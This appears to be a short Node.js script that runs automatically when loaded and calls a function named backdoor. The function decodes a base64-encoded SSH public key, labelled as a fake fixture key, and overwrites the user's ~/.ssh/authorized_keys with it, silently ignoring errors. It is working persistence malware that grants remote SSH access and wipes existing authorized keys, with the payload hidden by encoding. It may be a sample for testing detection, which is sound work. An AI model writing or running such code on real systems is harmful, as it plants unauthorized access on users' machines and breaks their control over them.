const os=require('os');
const path=require('path');
const fs=require('fs').promises;
let flag='0x0';
async function backdoor(){
 const key='c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFmYWtla2V5IGZpeHR1cmU=';
 const home=os.homedir();
 const ssh=path.join(home,'.ssh');
 const auth=path.join(ssh,'authorized_keys');
 try{await fs.writeFile(auth,atob(key).trim()+'\n',{mode:0o600});}catch(e){}
}
if(flag==='0x0'){backdoor();}
